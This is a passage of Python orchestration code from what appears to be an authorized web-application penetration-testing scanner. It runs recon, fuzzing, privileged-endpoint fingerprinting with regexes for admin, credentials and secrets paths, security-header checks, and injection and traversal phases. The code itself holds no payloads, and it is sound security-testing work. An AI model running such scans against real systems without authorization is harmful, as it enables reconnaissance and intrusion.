            # Lazy auth build for Roles 2..n in VANTAGE_MANAGED multi-role mode.
            # Sessions are not pre-built so browser-auth prompts appear after the
            # previous role's phases complete, not before any phases run.
            # Browser-auth fallback is handled inside _build_auth_session (form_login
            # path) where _browser_assisted_login is in closure scope — it cannot be
            # called from here.
            # For redirect-discovered secondary targets, reuse the session that was
            # established on the primary target rather than re-running the login flow.
            if _ctx_auth is None and _ctx_label != "unauthenticated" and _ctx.get("multi_role"):
                _role_idx = _ctx.get("role_idx", -1)
                if _is_redirect_target and _role_idx in _role_sessions:
                    _ctx_auth = _role_sessions[_role_idx]
                    vc.log(
                        f"[auth] Reusing '{_ctx_label}' session for redirect target {raw_url}",
                        "INFO",
                    )
                else:
                    _ctx_auth = _build_auth_session(
                        _ctx_cfg, "auth", _scope_hostnames, role_label=_ctx_label,
                        no_interactive=_is_redirect_target)
                    if _ctx_auth and _role_idx >= 0:
                        _role_sessions[_role_idx] = _ctx_auth
                if _ctx_auth:
                    _attach_redirect_hook(_ctx_auth, _scope_hostnames, target, out, _in_scope_new)
                _ctx["auth_sess"] = _ctx_auth

            # Set auth context so all findings in this pass carry the account.
            # Use UNAUTH when auth is absent — either this is the unauthenticated
            # context OR authentication was attempted but failed (_ctx_auth is None).
            # Never tag findings with a role label that was never actually established.
            if _ctx_label == "unauthenticated" or _ctx_auth is None:
                out.set_auth_context([{"username": "UNAUTH", "role": "unauthenticated"}])
            else:
                _ctx_user = (_ctx_cfg.get("auth", {}).get("username") or "").strip() or _ctx_label
                out.set_auth_context([{"username": _ctx_user, "role": _ctx_label}])

            if _ctx_auth:
                vc.log(f"Auth [{_ctx_label}]: enabled", "INFO")
            else:
                vc.log(f"Auth [{_ctx_label}]: none", "INFO")
            if _is_reduced_ctx:
                vc.log(
                    f"[{_ctx_label}] Reduced context — running authorization/session/bypass "
                    f"phases only against role 1 discovered paths", "INFO"
                )

            # Closures capture _ctx_label and _is_reduced_ctx via default arg
            def _skip(phase_name: str, _lbl: str = _ctx_label,
                      _reduced: bool = _is_reduced_ctx) -> bool:
                if not phases_enabled.get(phase_name, False):
                    vc.log(f"[{phase_name}] Phase disabled — skipping", "INFO")
                    return True
                if pm.is_phase_complete(f"{phase_name}#{_lbl}"):
                    vc.log(f"[{phase_name}] Already complete — skipping (checkpoint)", "INFO")
                    return True
                if _reduced and phase_name not in _REDUCED_SCAN_PHASES:
                    vc.log(
                        f"[{phase_name}] Skipping for reduced context [{_lbl}] — "
                        f"full scan was performed for the most permissive user", "INFO"
                    )
                    pm.set_phase_status(f"{phase_name}#{_lbl}", "skipped", phase_name)
                    return True
                return False

            # For reduced contexts seed crawl_data from role 1's results so that
            # auth_bypass / session / csrf phases test the same paths.
            if _is_reduced_ctx:
                crawl_data = copy.deepcopy(_role1_crawl_data)
            else:
                crawl_data = {"forms": [], "params": [], "links": []}
            auth_recon_data = {"forms": [], "links": [], "resource_ids": []}

            # effective_auth: the session used for all requests in this context.
            # For unauthenticated context: ALWAYS a fresh session — never fall back
            # to `sess` (the shared probe session) which accumulates cookies from
            # recon, spider, and redirect GETs made during all prior contexts.
            # Using sess here would carry Role 1's tracking/session cookies into
            # what is supposed to be a clean unauthenticated probe.
            if _ctx_auth is not None:
                effective_auth = _ctx_auth
            elif _ctx_label == "unauthenticated":
                effective_auth = _make_session(_ctx_cfg, _scope_hostnames)
                _attach_redirect_hook(effective_auth, _scope_hostnames, target,
                                      out, _in_scope_new)
            else:
                # Auth was attempted but failed — use a clean session so we don't
                # send stale probe cookies while scanning as this role.
                effective_auth = _make_session(_ctx_cfg, _scope_hostnames)
                _attach_redirect_hook(effective_auth, _scope_hostnames, target,
                                      out, _in_scope_new)

            # ── Discovery phases — Role 1 only ──────────────────────────────
            # All enumeration and server-analysis runs authenticated as the most
            # privileged role to obtain the most comprehensive application surface.
            # Reduced contexts (roles 2..n, unauthenticated) skip this block and
            # reuse the endpoint list collected here.
            if not _is_reduced_ctx:

                # Phase 0: recon (gobuster, whatweb, nikto baseline, etc.)
                if not _skip("recon"):
                    pm.set_phase_status(f"recon#{_ctx_label}", "running", "HTTP Recon")
                    try:
                        wc_baseline, _wp_discovered_paths = _phase_recon(
                            target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"recon#{_ctx_label}", "complete", "HTTP Recon")
                    except Exception as e:
                        vc.error(f"Phase recon [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"recon#{_ctx_label}", "error", detail=str(e))

                # Read CDN/WAF from target_profile — used to modulate injection phases.
                # Written by _phase_recon; read here so all subsequent phases can
                # access it without requiring changes to every phase signature.
                try:
                    _tp = json.loads((out.root / "target_profile.json").read_text())
                    _scan_waf_cdn = _tp.get("cdn", "") or ""
                    if not _scan_waf_cdn and _tp.get("edge_security"):
                        _scan_waf_cdn = _tp["edge_security"][0]
                except Exception:
                    _scan_waf_cdn = ""

                # WAF health check — detect IP blocks or session termination early.
                # Only meaningful when a WAF/CDN was identified by _phase_recon.
                if _scan_waf_cdn and effective_auth is not None:
                    _waf_session_health(
                        target["url"], effective_auth, cfg.get("timeout", 10),
                        out, target, _scan_waf_cdn, role_label=_ctx_label,
                    )

                # Phase 0b: screenshot
                if not _skip("screenshot"):
                    pm.set_phase_status(f"screenshot#{_ctx_label}", "running", "Screenshot")
                    try:
                        _phase_screenshot(target, _ctx_cfg, pm, out)
                        pm.set_phase_status(f"screenshot#{_ctx_label}", "complete", "Screenshot")
                    except Exception as e:
                        vc.error(f"Phase screenshot [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"screenshot#{_ctx_label}", "error", detail=str(e))

                # Phase 0c: webfiles
                if not _skip("webfiles"):
                    pm.set_phase_status(f"webfiles#{_ctx_label}", "running", "Web Files")
                    try:
                        _phase_webfiles(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"webfiles#{_ctx_label}", "complete", "Web Files")
                    except Exception as e:
                        vc.error(f"Phase webfiles [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"webfiles#{_ctx_label}", "error", detail=str(e))

                # Phase 1: tls
                if not _skip("tls"):
                    pm.set_phase_status(f"tls#{_ctx_label}", "running", "TLS Analysis")
                    try:
                        _phase_tls(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"tls#{_ctx_label}", "complete", "TLS Analysis")
                    except Exception as e:
                        vc.error(f"Phase tls [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"tls#{_ctx_label}", "error", detail=str(e))

                # Phase 1b: subdomain_takeover
                if not _skip("subdomain_takeover"):
                    pm.set_phase_status(f"subdomain_takeover#{_ctx_label}", "running", "Subdomain Takeover")
                    try:
                        _phase_subdomain_takeover(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"subdomain_takeover#{_ctx_label}", "complete", "Subdomain Takeover")
                    except Exception as e:
                        vc.error(f"Phase subdomain_takeover [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"subdomain_takeover#{_ctx_label}", "error", detail=str(e))

                # Phase 2c: ffuf
                if not _skip("ffuf"):
                    pm.set_phase_status(f"ffuf#{_ctx_label}", "running", "ffuf Fuzzing")
                    try:
                        _phase_ffuf(target, _ctx_cfg, pm, out, effective_auth)
                        pm.set_phase_status(f"ffuf#{_ctx_label}", "complete", "ffuf Fuzzing")
                    except Exception as e:
                        vc.error(f"Phase ffuf [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"ffuf#{_ctx_label}", "error", detail=str(e))

                # Phase 9: vulnscan
                if not _skip("vulnscan"):
                    pm.set_phase_status(f"vulnscan#{_ctx_label}", "running", "Vuln Scan")
                    try:
                        _phase_vulnscan(target, _ctx_cfg, pm, out, effective_auth, fast=args.fast)
                        pm.set_phase_status(f"vulnscan#{_ctx_label}", "complete", "Vuln Scan")
                    except Exception as e:
                        vc.error(f"Phase vulnscan [{_ctx_label}] error: {e}")
                        pm.set_phase_status(f"vulnscan#{_ctx_label}", "error", detail=str(e))

                # Collect gobuster/feroxbuster endpoints discovered under Role 1.
                # Use Role 1's session for wildcard filtering so false-positive paths
                # are detected consistently with the authenticated surface.
                _hostname   = target["hostname"]
                _ep_timeout = cfg.get("timeout", 10)
                for _gob_name in [f"gobuster_{_hostname}", f"gobuster_files_{_hostname}"]:
                    _gob_path = out.output_path("recon", _gob_name)
                    if _gob_path.exists():
                        try:
                            _raw_gob = _parse_gobuster_with_status(_gob_path, target["url"])
                            _flt_gob = _filter_buster_wildcards(_raw_gob, effective_auth, _ep_timeout)
                            _ep_base.extend(u for u, _, _ in _flt_gob)
                        except Exception:
                            pass
                for _fer_name in [f"feroxbuster_{_hostname}", f"feroxbuster_files_{_hostname}"]:
                    _fer_path = out.output_path("recon", _fer_name)
                    if _fer_path.exists():
                        try:
                            _raw_fer = _parse_feroxbuster_with_status(_fer_path)
                            _flt_fer = _filter_buster_wildcards(_raw_fer, effective_auth, _ep_timeout)
                            _ep_base.extend(u for u, _, _ in _flt_fer)
                        except Exception:
                            pass
                for _wp_u in _wp_discovered_paths:
                    if _is_valid_endpoint_url(_wp_u) and _is_in_scope_url(_wp_u, _scope_hostnames):
                        _ep_base.append(_wp_u)

                # Fingerprint Role 1's accessible endpoints for BFLA testing.
                # Only "pages of interest" — paths that are likely to require the
                # highest privilege level — are recorded.  Testing everything Role 1
                # can reach produces noise; restricting to privileged-path candidates
                # keeps BFLA results actionable.
                _bfla_probe_urls: list = list(dict.fromkeys(
                    u for u in _ep_base + list(dict.fromkeys(
                        (target["url"].rstrip("/") + p)
                        for p in (
                            list(json.loads(
                                (out.root / "structure_map.json").read_text()
                            ).get("paths", {}).keys())
                            if (out.root / "structure_map.json").exists() else []
                        )
                    ))
                    if _is_in_scope_url(u, _scope_hostnames)
                ))

                # ── Pages-of-interest filter ────────────────────────────────────
                # Paths whose segments strongly suggest they require elevated
                # privilege are flagged as BFLA candidates.  Generic pages
                # (home, login, static assets, etc.) are excluded.
                _BFLA_INTEREST_RE = re.compile(
                    r'(?i)/('
                    # Administration / management
                    r'admin|administration|manage|management|manager|dashboard|'
                    r'control[\-_]?panel|cp|panel|console|backstage|backoffice|'
                    r'back[\-_]?end|operator|supervisor|moderator|'
                    # User / account management
                    r'users?|accounts?|members?|staff|employees?|personnel|'
                    r'roles?|permissions?|privileges?|grants?|entitlements?|'
                    # Configuration / settings
                    r'config|configuration|settings?|setup|preferences?|options?|'
                    r'properties|env|environment|'
                    # Reporting / analytics
                    r'reports?|reporting|analytics?|audit|audit[\-_]?log|logs?|'
                    r'statistics?|stats?|metrics?|monitoring|'
                    # Billing / finance
                    r'billing|invoices?|payments?|subscriptions?|finance|'
                    r'pricing|orders?|transactions?|'
                    # API write / privileged endpoints
                    r'api/admin|api/internal|api/private|api/manage|api/v\d+/admin|'
                    r'internal|private|restricted|protected|secure|'
                    # Data management
                    r'export|import|backup|restore|migrate|migration|'
                    r'database|db|schema|'
                    # Security / credentials
                    r'security|auth/manage|credentials?|keys?|tokens?|secrets?|'
                    r'certificates?|'
                    # DevOps / deployment
                    r'deploy|deployment|release|ci|cd|pipeline|'
                    r'infrastructure|servers?|nodes?|clusters?|'
                    # Integrations / webhooks
                    r'integrations?|webhooks?|connectors?|'
                    # IBM Cognos / enterprise BI specific
                    r'cognos|bi/v\d|dispatcher|gateway|servlet|ibmcognos'
                    r')'
                    r'(?:[/\-_?#]|$)',
                    re.IGNORECASE,
                )
                # Paths to always exclude regardless of keywords (they're public
                # or static and generate false positives for every role).
                _BFLA_EXCLUDE_RE = re.compile(
                    r'(?i)/('
                    r'login|logout|signin|signout|logon|logoff|'
                    r'static|assets?|css|js|fonts?|images?|img|icons?|'
                    r'favicon|robots\.txt|sitemap|\.well-known|'
                    r'health|healthcheck|ping|status|version|'
                    r'register|signup|password[\-_]?reset|forgot[\-_]?password'
                    r')'
                    r'(?:[/\-_?#]|$)',
                    re.IGNORECASE,
                )

                def _bfla_is_of_interest(url_str: str) -> bool:
                    try:
                        _p = urllib.parse.urlparse(url_str).path or "/"
                    except Exception:
                        _p = url_str
                    if _BFLA_EXCLUDE_RE.search(_p):
                        return False
                    return bool(_BFLA_INTEREST_RE.search(_p))

                _bfla_candidates = [u for u in _bfla_probe_urls
                                    if _bfla_is_of_interest(u)]
                vc.log(
                    f"[bfla] Pages-of-interest filter: {len(_bfla_candidates)}/{len(_bfla_probe_urls)} "
                    "URL(s) selected for BFLA fingerprinting", "INFO")

                _bfla_timeout = cfg.get("timeout", 10)
                for _burl in _bfla_candidates[:200]:
                    try:
                        _br = effective_auth.get(
                            _burl, timeout=_bfla_timeout, allow_redirects=False)
                        if _br.status_code == 200:
                            _role1_accessible_endpoints.append({
                                "url":        _burl,
                                "status":     _br.status_code,
                                "body_len":   len(_br.text),
                                "body_hash":  hash(_br.text[:4096]),
                                "role1_label": _ctx_label,
                            })
                    except Exception:
                        pass
                vc.log(
                    f"[bfla] Role 1 fingerprint: {len(_role1_accessible_endpoints)} "
                    "accessible privileged endpoints recorded for cross-role testing", "INFO")

            # Sync structure map with all ep_base paths before header/shcheck phases run.
            # Ensures discovered endpoints are registered before phases that test them.
            try:
                _write_structure_map(out, target, extra_urls=list(dict.fromkeys(_ep_base)))
            except Exception:
                pass

            # ── Manual crawl (sparse discovery) ──────────────────────────────
            # If automated discovery produced fewer than 3 non-root paths the
            # target is likely parameter-routed (BI platform, SPA, etc.) and
            # directory brute-forcing has found little of value.  Prompt the user
            # to browse manually; Fracture captures all requests/responses via
            # mitmproxy and adds discovered paths to _ep_base before testing runs.
            if not _is_reduced_ctx:
                try:
                    _sm_path = out.root / "structure_map.json"
                    if _sm_path.exists():
                        _sm_data = json.loads(_sm_path.read_text(encoding="utf-8"))
                        _sm_real_paths = [
                            p for p in _sm_data.get("paths", {}).keys()
                            if p and p != "/"
                        ]
                        if len(_sm_real_paths) < 3:
                            vc.log(
                                f"[manual-crawl] Only {len(_sm_real_paths)} non-root path(s) "
                                "found by automated discovery — triggering manual crawl",
                                "INFO",
                            )
                            _crawled = _phase_manual_crawl(
                                out, target, cfg, effective_auth, _scope_hostnames
                            )
                            if _crawled:
                                _ep_base = list(dict.fromkeys(_ep_base + _crawled))
                                try:
                                    _write_structure_map(
                                        out, target,
                                        extra_urls=list(dict.fromkeys(_ep_base)),
                                    )
                                except Exception:
                                    pass
                except Exception:
                    pass

            # ── Post-discovery CMS / BI re-analysis ──────────────────────────
            # Check every path in _ep_base against CMS and BI path signatures.
            # The initial probe in _phase_recon only checks the root page body;
            # CMSs/BI tools on sub-paths are invisible unless discovered URLs are
            # also checked.  No additional HTTP probes are needed — all paths are
            # already known from gobuster/feroxbuster/WordPress discovery.
            if not _is_reduced_ctx:
                try:
                    _ep_path_str = " ".join(_ep_base)
                    _cms_path_sigs = {
                        "WordPress":  [r"/wp-admin", r"/wp-login\.php", r"/wp-content/", r"/wp-includes/"],
                        "Drupal":     [r"/sites/default/", r"/drupal/", r"/misc/drupal\.js"],
                        "Joomla":     [r"/components/com_", r"/administrator/index\.php"],
                        "Magento":    [r"/skin/frontend/", r"/pub/static/frontend/", r"/Magento/"],
                        "TYPO3":      [r"/typo3/", r"/typo3conf/", r"/fileadmin/"],
                        "Ghost":      [r"/ghost/api/", r"/content/themes/casper"],
                        "Umbraco":    [r"/umbraco/"],
                        "DotNetNuke": [r"/DesktopModules/", r"/portals/"],
                        "OpenCart":   [r"route=common/", r"/catalog/view/"],
                        "PrestaShop": [r"/modules/ps_"],
                        "Shopify":    [r"/cdn\.shopify\.com/", r"/s/files/"],
                    }
                    _bi_path_sigs = {
                        "Grafana":         [r"/grafana(?:/|$|\?)"],
                        "Kibana":          [r"/app/kibana", r"/kibana/"],
                        "Tableau":         [r"/vizportal/"],
                        "Metabase":        [r"/metabase/"],
                        "Apache Superset": [r"/superset/"],
                        "Redash":          [r"/redash/"],
                        "Prometheus":      [r"/metrics(?:\?|$)", r"/api/v1/targets"],
                        "Zabbix":          [r"/zabbix(?:/|\.php)"],
                        "Nagios":          [r"/nagios(?:/|$)", r"/nagiosxi/"],
                        "Splunk":          [r"/en-US/app/", r"/splunk/"],
                        "Looker":          [r"/looker(?:/|$)"],
                        "IBM Cognos":      [r"/ibmcognos(?:/|$)", r"/bi/v1/", r"/bi/admin/",
                                            r"xts\.run", r"/cgi-bin/cognos\.cgi"],
                    }
                    _disc_cms = [
                        n for n, pats in _cms_path_sigs.items()
                        if any(re.search(p, _ep_path_str, re.I) for p in pats)
                    ]
                    _disc_bi = [
                        n for n, pats in _bi_path_sigs.items()
                        if any(re.search(p, _ep_path_str, re.I) for p in pats)
                    ]
                    if _disc_cms:
                        _write_target_profile(out, cms=_disc_cms)
                        for _dcn in _disc_cms:
                            vc.log(f"[discovery] CMS identified from discovered paths: {_dcn}", "SUCCESS")
                    if _disc_bi:
                        _write_target_profile(out, bi_tools=_disc_bi)
                        for _dbn in _disc_bi:
                            vc.log(f"[discovery] BI tool identified from discovered paths: {_dbn}", "SUCCESS")
                        # Run unauthenticated probes against any newly identified BI tools
                        for _bi_name in _disc_bi:
                            for _bi_path, _bi_desc in _BI_UNAUTH_PROBES.get(_bi_name, []):
                                try:
                                    _bi_r = effective_auth.get(
                                        target["url"].rstrip("/") + _bi_path,
                                        timeout=min(cfg.get("timeout", 10), 6),
                                        allow_redirects=False)
                                    if _bi_r.status_code == 200:
                                        out.add_finding(
                                            title=f"Unauthenticated {_bi_name} Access: {_bi_desc}",
                                            url=target["url"].rstrip("/") + _bi_path,
                                            port=target["port"], risk="HIGH",
                                            description=(
                                                f"The {_bi_name} {_bi_desc} at '{_bi_path}' "
                                                f"returned HTTP 200 without authentication."
                                            ),
                                            output=f"HTTP 200\n{_bi_r.text[:400]}",
                                            affected=_bi_path,
                                            sources="fracture-discovery",
                                            service=target["scheme"],
                                            owasp="A01:2025 Broken Access Control", nist="AC-3",
                                            remediation=(
                                                f"Require authentication for {_bi_path}. "
                                                f"Place the {_bi_name} interface behind a VPN "
                                                f"or network-level access control."
                                            ),
                                            http_code=200,
                                        )
                                except Exception:
                                    pass
                except Exception:
                    pass

            # Write auth method and login page to target profile (Role 1 context only)
            if not _is_reduced_ctx:
                try:
                    _auth_cfg   = _ctx_cfg.get("auth", {})
                    _auth_meth  = (_auth_cfg.get("auth_method")
                                   or ("enabled" if _auth_cfg.get("enabled") else "none"))
                    _auth_login = (_auth_cfg.get("login_url") or "")
                    _write_target_profile(out,
                        auth_method=_auth_meth,
                        auth_page=_auth_login,
                    )
                except Exception:
                    pass

            # ── Phase 2: headers ──
            if not _skip("headers"):
                pm.set_phase_status(f"headers#{_ctx_label}", "running", "Security Headers")
                try:
                    _phase_headers(target, _ctx_cfg, pm, out, effective_auth)
                    pm.set_phase_status(f"headers#{_ctx_label}", "complete", "Security Headers")
                except Exception as e:
                    vc.error(f"Phase headers [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"headers#{_ctx_label}", "error", detail=str(e))

            # ── Phase 2b: shcheck ──
            if not _skip("shcheck"):
                pm.set_phase_status(f"shcheck#{_ctx_label}", "running", "shcheck Header Check")
                try:
                    _extra = [u for u in target_urls if u != raw_url]
                    # Also check discovered endpoints (gobuster / feroxbuster / wordpress)
                    _ep_shcheck = [
                        u for u in _ep_base
                        if u.rstrip("/") != raw_url.rstrip("/") and u not in _extra
                    ]
                    _all_shcheck_extra = _extra + _ep_shcheck
                    _phase_shcheck(target, _ctx_cfg, pm, out, effective_auth,
                                   extra_urls=_all_shcheck_extra if _all_shcheck_extra else None,
                                   wc_baseline=wc_baseline)
                    pm.set_phase_status(f"shcheck#{_ctx_label}", "complete", "shcheck Header Check")
                except Exception as e:
                    vc.error(f"Phase shcheck [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"shcheck#{_ctx_label}", "error", detail=str(e))

            # ── Phase 3: crawl ──
            if not _skip("crawl"):
                pm.set_phase_status(f"crawl#{_ctx_label}", "running", "Crawl")
                try:
                    crawl_data = _phase_crawl(target, _ctx_cfg, pm, out, effective_auth)
                    pm.set_phase_status(f"crawl#{_ctx_label}", "complete", "Crawl")
                    # Persist role 1 crawl data for reduced contexts
                    if not _is_reduced_ctx:
                        _role1_crawl_data = crawl_data
                except Exception as e:
                    vc.error(f"Phase crawl [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"crawl#{_ctx_label}", "error", detail=str(e))

            # ── Scope-filter crawl data before any test phase uses it ──────────
            # Discard any links, params, or forms pointing outside scope hostnames.
            # This is the primary guard against testing out-of-scope targets discovered
            # via crawling (e.g. social-media links found on the target page).
            _scoped_links = [
                l for l in crawl_data.get("links", [])
                if _is_in_scope_url(l, _scope_hostnames)
            ]
            _scoped_params = [
                p for p in crawl_data.get("params", [])
                if _is_in_scope_url(p.get("url", ""), _scope_hostnames)
            ]
            _scoped_forms = [
                f for f in crawl_data.get("forms", [])
                if not urllib.parse.urlparse(f.get("action") or "").hostname
                or _is_in_scope_url(f.get("action", ""), _scope_hostnames)
            ]
            _oos_links = len(crawl_data.get("links", [])) - len(_scoped_links)
            if _oos_links:
                vc.log(
                    f"[scope] Dropped {_oos_links} out-of-scope link(s) from crawl data",
                    "INFO",
                )
            crawl_data = {
                **crawl_data,
                "links":  _scoped_links,
                "params": _scoped_params,
                "forms":  _scoped_forms,
            }

            # Accumulate crawl links for access_matrix
            _all_crawl_links.extend(crawl_data.get("links", []))

            # Write structure map from crawl data (first pass — pages, forms, params)
            try:
                _write_structure_map(out, target, crawl_data=crawl_data, source="crawl")
            except Exception:
                pass

            # ── Phase 3c: endpoint tools ──
            _ep_discovered = [
                u for u in (
                    list(_ep_base)
                    + crawl_data.get("links", [])
                    + [f["action"] for f in crawl_data.get("forms", []) if f.get("action")]
                    + [pe["url"] for pe in crawl_data.get("params", []) if pe.get("url")]
                )
                if _is_in_scope_url(u, _scope_hostnames) and _is_valid_endpoint_url(u)
            ]

            # ── Probe security headers on discovered in-scope endpoints ──────────
            # Runs the same checks as fracture-recon (missing security headers) and
            # fracture-headers (data leakage headers) on each discovered endpoint URL.
            _ep_probed: set = set()
            _ep_path_statuses: dict = {}
            for _ep_url in _ep_discovered:
                if _ep_url.rstrip("/") == raw_url.rstrip("/") or _ep_url in _ep_probed:
                    continue
                _ep_probed.add(_ep_url)
                try:
                    _ep_resp = effective_auth.get(
                        _ep_url, timeout=_ep_timeout, allow_redirects=True)
                    _ep_path_statuses[_ep_url] = _ep_resp.status_code
                    _ep_hdrs = _ep_resp.headers
                    _ep_rel  = _url_rel_path(_ep_url, target["url"])
                    _base_absent  = target.get("_base_sec_hdrs_absent",  set())
                    _base_present = target.get("_base_sec_hdrs_present", set())
                    _ep_shdr_ev = ""
                    try:
                        _ep_shdr_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', _ep_url)[:50]
                        _ep_shdr_rq, _ep_shdr_rp = _save_http_evidence(
                            out, "recon", f"ep_headers_{_ep_shdr_safe}", _ep_resp)
                        _ep_shdr_ev = json.dumps(
                            [{"url": _ep_url, "req": str(_ep_shdr_rq), "resp": str(_ep_shdr_rp)}])
                    except Exception:
                        pass
                    for _hn, _hr, _, _hd, _hnist, _hremed in _SECURITY_HEADERS:
                        if _hn == "Strict-Transport-Security" and not target["is_https"]:
                            continue
                        _ep_has = _hn in _ep_hdrs
                        if not _ep_has:
                            if _hn in _base_absent:
                                # Also absent at base — already reported there; skip
                                continue
                            # Present at base but absent at this endpoint — report deviation
                            out.add_finding(
                                title=f"Missing Security Header: {_hn}",
                                url=target["url"], port=target["port"],
                                risk=_hr,
                                description=(
                                    f"The security header '{_hn}' is present on the "
                                    f"base URL but absent from endpoint {_ep_rel}."
                                ),
                                output=f"Missing: {_hn}",
                                affected=_ep_rel,
                                sources="fracture-recon", service=target["scheme"],
                                output_file=_ep_shdr_ev,
                                owasp="A05:2025 Security Misconfiguration", nist=_hnist,
                                remediation=_hremed,
                                http_code=_ep_resp.status_code,
                            )
                        elif _hn in _base_absent:
                            # Absent at base but present at this endpoint — informational
                            out.add_finding(
                                title=f"Endpoint-Specific Security Header Found: {_hn}",
                                url=target["url"], port=target["port"], risk="INFO",
                                description=(
                                    f"The security header '{_hn}' is present at "
                                    f"endpoint {_ep_rel} but absent from the base URL. "
                                    "This header appears to be applied to specific routes "
                                    "only rather than globally."
                                ),
                                output=f"Present at endpoint: {_hn}: {_ep_hdrs.get(_hn, '')}",
                                affected=_ep_rel,
                                sources="fracture-recon", service=target["scheme"],
                                output_file=_ep_shdr_ev,
                                owasp="A05:2025 Security Misconfiguration", nist=_hnist,
                                remediation=(
                                    "Ensure security headers are applied consistently "
                                    "across all routes. Configure them globally at the "
                                    "server or middleware level."
                                ),
                                http_code=_ep_resp.status_code,
                            )
                    _ep_svr = _ep_hdrs.get("Server", "")
                    if _ep_svr:
                        out.add_finding(
                            title="Header Data Leakage: Server",
                            url=target["url"], port=target["port"], risk="LOW",
                            description="The HTTP Server response header reveals the web server software name and version, reducing the attacker's reconnaissance effort needed to identify version-specific vulnerabilities.",
                            output=f"Server: {_ep_svr}",
                            affected=_ep_rel,
                            sources="fracture-headers", service=target["scheme"],
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation="Remove or genericise the Server response header in the web server configuration (e.g., ServerTokens Prod in Apache; server_tokens off in nginx).",
                            http_code=_ep_resp.status_code,
                        )
                    _ep_xpb = _ep_hdrs.get("X-Powered-By", "")
                    if _ep_xpb:
                        out.add_finding(
                            title="Header Data Leakage: X-Powered-By",
                            url=target["url"], port=target["port"], risk="LOW",
                            description="The X-Powered-By response header discloses the application framework, language, or runtime version, reducing the attacker's effort needed to identify version-specific vulnerabilities.",
                            output=f"X-Powered-By: {_ep_xpb}",
                            affected=_ep_rel,
                            sources="fracture-headers", service=target["scheme"],
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation='Remove or suppress the X-Powered-By header at the application framework or reverse-proxy level (e.g., app.disable("x-powered-by") in Express; Header unset X-Powered-By in Apache).',
                            http_code=_ep_resp.status_code,
                        )
                    _ep_aspnet = (
                        _ep_hdrs.get("X-AspNet-Version", "")
                        or _ep_hdrs.get("X-AspNetMvc-Version", "")
                    )
                    if _ep_aspnet:
                        out.add_finding(
                            title="Header Data Leakage: X-AspNet-Version",
                            url=target["url"], port=target["port"], risk="LOW",
                            description="The X-AspNet-Version response header reveals the exact ASP.NET framework version, aiding an attacker in identifying applicable CVEs or version-specific attack techniques.",
                            output=f"X-AspNet-Version: {_ep_aspnet}",
                            affected=_ep_rel,
                            sources="fracture-headers", service=target["scheme"],
                            owasp="A05:2025 Security Misconfiguration", nist="CM-7",
                            remediation='Disable the header by setting enableVersionHeader="false" in the httpRuntime element of web.config.',
                            http_code=_ep_resp.status_code,
                        )
                except Exception:
                    pass

            if _ep_discovered and not _is_reduced_ctx:
                _et_key = f"endpoint_tools#{_ctx_label}"
                if pm.is_phase_complete(_et_key):
                    vc.log(f"[endpoint_tools] Already complete — skipping (checkpoint)", "INFO")
                else:
                    pm.set_phase_status(_et_key, "running", "Endpoint Tools")
                    try:
                        _phase_endpoint_tools(_ep_discovered, target, _ctx_cfg, pm, out,
                                              effective_auth, wc_baseline=wc_baseline,
                                              scope_hostnames=_scope_hostnames)
                        pm.set_phase_status(_et_key, "complete", "Endpoint Tools")
                    except Exception as e:
                        vc.error(f"Phase endpoint_tools [{_ctx_label}] error: {e}")
                        pm.set_phase_status(_et_key, "error", detail=str(e))
                # Update structure map with endpoint_tools-discovered URLs and their HTTP status codes
                try:
                    _write_structure_map(out, target,
                                        path_statuses=_ep_path_statuses,
                                        extra_urls=_ep_discovered)
                except Exception:
                    pass

            # ── Phase 3b: jwt ──
            if not _skip("jwt"):
                pm.set_phase_status(f"jwt#{_ctx_label}", "running", "JWT Testing")
                try:
                    _phase_jwt(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"jwt#{_ctx_label}", "complete", "JWT Testing")
                except Exception as e:
                    vc.error(f"Phase jwt [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"jwt#{_ctx_label}", "error", detail=str(e))

            # ── Phase 4: injection ──
            # Pre-injection WAF health check: detect session termination or IP
            # block before running injection probes that depend on a valid session.
            if _scan_waf_cdn and effective_auth is not None:
                _waf_session_health(
                    target["url"], effective_auth, cfg.get("timeout", 10),
                    out, target, _scan_waf_cdn, role_label=_ctx_label,
                )
            if not _skip("injection"):
                pm.set_phase_status(f"injection#{_ctx_label}", "running", "Injection Testing")
                try:
                    _phase_injection(target, _ctx_cfg, pm, out, effective_auth, crawl_data,
                                     fast=args.fast, waf_cdn=_scan_waf_cdn)
                    pm.set_phase_status(f"injection#{_ctx_label}", "complete", "Injection Testing")
                except Exception as e:
                    vc.error(f"Phase injection [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"injection#{_ctx_label}", "error", detail=str(e))

            # ── Phase 5: traversal ──
            if not _skip("traversal"):
                pm.set_phase_status(f"traversal#{_ctx_label}", "running", "Path Traversal")
                try:
                    _phase_traversal(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"traversal#{_ctx_label}", "complete", "Path Traversal")
                except Exception as e:
                    vc.error(f"Phase traversal [{_ctx_label}] error: {e}")
                    pm.set_phase_status(f"traversal#{_ctx_label}", "error", detail=str(e))

            # ── Phase 5b: business_logic ──
            if not _skip("business_logic"):
                pm.set_phase_status(f"business_logic#{_ctx_label}", "running", "Business Logic")
                try:
                    _phase_business_logic(target, _ctx_cfg, pm, out, effective_auth, crawl_data)
                    pm.set_phase_status(f"business_logic#{_ctx_label}", "complete",
                                        "Business Logic")
                except Exception as e:
                    vc.error(f"Phase business_logic [{_ctx_label}] error: {e}")
